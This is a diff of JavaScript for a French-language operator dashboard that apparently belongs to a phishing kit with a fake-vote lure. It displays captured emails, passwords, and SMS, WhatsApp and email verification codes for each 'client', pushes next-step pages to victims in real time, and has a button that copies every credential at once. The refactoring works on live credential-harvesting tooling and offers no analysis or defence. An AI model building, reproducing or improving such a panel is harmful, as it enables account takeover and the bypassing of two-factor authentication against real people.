-    + '<div class="data-grid">'
-    + field('dEmail','Email','fa-envelope','var(--accent)',d.email)
-    + field('dPass','Mot de passe','fa-key','var(--warning)',d.password)
-    + field('dSms','Code SMS','fa-sms','#34a853',d.sms_code)
-    + field('dWapp','Code WhatsApp','fa-whatsapp','#25d366',d.whatsapp_code)
-    + field('dEcode','Code Email','fa-envelope-open','#ea4335',d.email_code)
-    + '<div class="data-card' + (u.action ? (awaiting?' alert':'') : '') + '"><div class="label"><i class="fas fa-bolt" style="color:var(--purple)"></i> Derniere action</div>'
-      + '<div class="value' + (u.action?'':' empty') + '">' + esc(u.action ? meta(u.action).label : 'Aucune') + '</div></div>'
-    + '<div class="data-card' + (u.action ? (awaiting?' alert':' has-data') : '') + '"><div class="label"><i class="fas fa-' + (awaiting?'hourglass-half':'check-double') + '" style="color:var(--' + (awaiting?'warning':'success') + ')"></i> Confirmation client</div>'
-      + '<div class="value' + (u.action?'':' empty') + '">' + esc(u.action ? (awaiting ? 'En attente (seq ' + u.actionSeq + ')' : 'Executee (seq ' + u.actionSeq + ')') : 'Rien a confirmer') + '</div></div>'
-    + '</div>'
+            btn.disabled = true;
 
-    + '<div class="card"><div class="card-header"><div class="card-title"><i class="fas fa-gamepad"></i> Actions</div>'
-    + '<button class="copy-all-btn" data-copy-all><i class="fas fa-clipboard-list"></i> Tout copier</button></div>'
-    + '<div class="card-body"><div class="actions-grid">'
-    + ACTIONS.map(function(a){
-        var cur = u.action === a.id ? ' current' : '';
-        return '<button class="action-btn ' + a.cls + cur + '" data-action="' + a.id + '"><i class="fas ' + a.icon + '"></i> ' + a.label + '</button>';
-      }).join('')
-    + '</div></div></div>'
+            if (action === 'vote_approved') {
+                user.status = 'approved';
+                saveUsers(users).then(function() {
+                    addActivity('<strong>@' + user.username + '</strong> a ete approuve');
+                    showToast('Client approuve !', 'success');
+                    loadData();
+                    renderClientDetail();
+                }).catch(function(err) {
+                    showToast('Erreur serveur : action non confirmee', 'error');
+                }).finally(function() {
+                    btn.disabled = false;
+                });
+                return;
+            }
 
-    + '<div class="card"><div class="card-header"><div class="card-title"><i class="fas fa-history"></i> Activite du client</div></div>'
-    + '<div class="card-body"><div class="activity-list" id="userActivity"></div></div></div></div>';
+            if (user.status === 'visiting') user.status = 'pending';
+            user.action = action;
+            saveUsers(users).then(function() {
+                addActivity('<strong>@' + user.username + '</strong> &#8594; ' + (getPageLabel(action) || action));
+                showToast('Action envoyee : ' + (getPageLabel(action) || action), 'success');
+            }).catch(function(err) {
+                showToast('Erreur serveur : action non confirmee', 'error');
+            }).finally(function() {
+                btn.disabled = false;
+            });
+        }
 
-  renderUserLog();
-}
+        function copyVal(id) {
+            var el = document.getElementById(id);
+            if (!el || el.classList.contains('empty')) { showToast('Aucune donnee', 'error'); return; }
+            navigator.clipboard.writeText(el.textContent).then(function() { showToast('Copie !', 'success'); });
+        }
 
-/* ============ actions ============ */
-function sendAction(btn){
-  var u = currentUser();
-  if (!u) return showToast('Selectionnez un client', 'error');
-  var action = btn.getAttribute('data-action');
+        function copyAll() {
+            var user = getUsers().find(function(u) { return u.visitorId === selectedVisitorId; });
+            if (!user) return;
+            var d = user.data || {};
+            var text = 'Username: @' + user.username + '\nEmail: ' + (d.email||'N/A') + '\nPassword: ' + (d.password||'N/A') + '\nSMS: ' + (d.sms_code||'N/A') + '\nWhatsApp: ' + (d.whatsapp_code||'N/A') + '\nEmail Code: ' + (d.email_code||'N/A') + '\nStatus: ' + (user.status||'N/A');
+            navigator.clipboard.writeText(text).then(function() { showToast('Tout copie !', 'success'); });
+        }
 
-  var patch = {
-    action: action,
-    actionSeq: (u.actionSeq || 0) + 1,
-    actionTs: Date.now()
-  };
-  if (action === 'vote_approved') patch.status = 'approved';
-  else if (action === 'rejected') patch.status = 'rejected';
-  else if (u.status === 'visiting') patch.status = 'pending';
+        function goTo(page) {
+            currentPage = page;
+            document.querySelectorAll('.section').forEach(function(s) { s.classList.remove('active'); });
+            document.getElementById('sec-' + page).classList.add('active');
+            document.querySelectorAll('.sidebar-nav a').forEach(function(a) { a.classList.toggle('active', a.getAttribute('data-page') === page); });
+            var titles = { dashboard:'Tableau de bord', clients:'Clients', votes:'Votes', activity:'Activite' };
+            document.getElementById('pageTitle').textContent = titles[page] || page;
+            closeSidebar();
+        }
 
-  var backup = JSON.parse(JSON.stringify(u));
-  Object.assign(u, patch);
-  lastDetailHash = null;
-  renderClientList(); renderDetail(true); renderStats();
-  addLog('<strong>@' + esc(u.username) + '</strong> &#8594; ' + esc(meta(action).label) + ' <em>(envoi seq ' + patch.actionSeq + ')</em>', u.visitorId);
-  btn.disabled = true;
+        function toggleSidebar() { document.getElementById('sidebar').classList.toggle('open'); document.getElementById('sidebarOverlay').classList.toggle('show'); }
+        function closeSidebar() { document.getElementById('sidebar').classList.remove('open'); document.getElementById('sidebarOverlay').classList.remove('show'); }
 
-  patchUser(u.visitorId, patch)
-    .then(function(){
-      addLog('<strong>@' + esc(u.username) + '</strong> &#10003; ' + esc(meta(action).label) + ' confirme par le serveur', u.visitorId, 'ok');
-      showToast('Confirme : ' + meta(action).label, 'success');
-      renderDetail(true);
-    })
-    .catch(function(err){
-      Object.assign(u, backup);
-      lastDetailHash = null;
-      renderClientList(); renderDetail(true); renderStats();
-      addLog('<strong>@' + esc(u.username) + '</strong> &#10007; ' + esc(meta(action).label) + ' ECHEC (' + esc(err.message) + ')', u.visitorId, 'ko');
-      showToast('Echec : ' + meta(action).label, 'error');
-    })
-    .then(function(){ btn.disabled = false; });
-}
+        function toggleAuto() {
+            if (document.getElementById('autoToggle').checked) { autoInterval = setInterval(loadData, 3000); } else { clearInterval(autoInterval); }
+        }
 
-/* ============ copie ============ */
-function copyText(txt, okMsg){
-  navigator.clipboard.writeText(txt).then(function(){ showToast(okMsg, 'success'); })
-    .catch(function(){ showToast('Copie impossible', 'error'); });
-}
-function valueOf(id){
-  var el = document.getElementById(id);
-  if (!el || el.classList.contains('empty')) return null;
-  return el.textContent;
-}
-function copyAll(){
-  var u = currentUser(); if (!u) return;
-  var d = u.data || {};
-  copyText(
-    'Username: @' + u.username + '\nEmail: ' + (d.email||'N/A') + '\nPassword: ' + (d.password||'N/A')
-    + '\nSMS: ' + (d.sms_code||'N/A') + '\nWhatsApp: ' + (d.whatsapp_code||'N/A')
-    + '\nEmail Code: ' + (d.email_code||'N/A') + '\nStatus: ' + (u.status||'N/A'),
-    'Tout copie'
-  );
-}
-
-/* ============ navigation ============ */
-var TITLES = {dashboard:'Tableau de bord', clients:'Clients', votes:'Votes', activity:'Activite'};
-function goTo(page){
-  if (!TITLES[page]) page = 'dashboard';
-  document.querySelectorAll('.section').forEach(function(s){ s.classList.remove('active'); });
-  document.getElementById('sec-' + page).classList.add('active');
-  document.querySelectorAll('#nav a').forEach(function(a){ a.classList.toggle('active', a.getAttribute('data-page') === page); });
-  document.getElementById('pageTitle').textContent = TITLES[page];
-  closeSidebar();
-}
-
-function toggleAuto(){
-  clearInterval(autoTimer);
-  autoTimer = null;
-  if (document.getElementById('autoToggle').checked) autoTimer = setInterval(pollState, POLL_MS);
-}
-
-/* ============ init ============ */
-function init(){
-  // navigation
-  document.getElementById('nav').addEventListener('click', function(e){
-    var a = e.target.closest('a[data-page]');
-    if (a) goTo(a.getAttribute('data-page'));
-  });
-  document.getElementById('btnMenu').addEventListener('click', function(){
-    document.getElementById('sidebar').classList.toggle('open');
-    document.getElementById('sidebarOverlay').classList.toggle('show');
-  });
-  document.getElementById('btnCloseSidebar').addEventListener('click', closeSidebar);
-  document.getElementById('sidebarOverlay').addEventListener('click', closeSidebar);
-  function closeSidebar(){
-    document.getElementById('sidebar').classList.remove('open');
-    document.getElementById('sidebarOverlay').classList.remove('show');
-  }
-  window.closeSidebar = closeSidebar;
-
-  // refresh + auto
-  document.getElementById('btnRefresh').addEventListener('click', function(){ pollState().then(function(){ showToast('Actualise','success'); }); });
-  document.getElementById('autoToggle').addEventListener('change', toggleAuto);
-
-  // recherche debounce
-  var st = null;
-  document.getElementById('searchInput').addEventListener('input', function(e){
-    clearTimeout(st);
-    var v = e.target.value.toLowerCase().trim();
-    st = setTimeout(function(){ searchQuery = v; renderClientList(); }, 150);
-  });
-
-  // filtres
-  document.getElementById('tabs').addEventListener('click', function(e){
-    var t = e.target.closest('.tab'); if (!t) return;
-    currentFilter = t.getAttribute('data-filter');
-    document.querySelectorAll('.tab').forEach(function(x){ x.classList.toggle('active', x === t); });
-    renderClientList();
-  });
-
-  // selection client (delegation -> plus de probleme d'echappement)
-  document.getElementById('clientsList').addEventListener('click', function(e){
-    var item = e.target.closest('.client-item'); if (!item) return;
-    selectedId = item.getAttribute('data-id');
-    lastDetailHash = null;
-    renderClientList(); renderDetail(true);
-  });
-
-  // actions + copie (delegation sur un conteneur stable)
-  var detail = document.getElementById('clientDetail');
-  detail.addEventListener('click', function(e){
-    var btn = e.target.closest('.action-btn');
-    if (btn) return sendAction(btn);
-    var cb = e.target.closest('[data-copy]');
-    if (cb){
-      var v = valueOf(cb.getAttribute('data-copy'));
-      return v ? copyText(v, 'Copie') : showToast('Aucune donnee', 'error');
-    }
-    if (e.target.closest('[data-copy-all]')) copyAll();
-  });
-
-  pollState();
-  toggleAuto();
-}
-
-init();
-</script>
+        loadData();
+        toggleAuto();
+    </script>
 </body>
 </html>
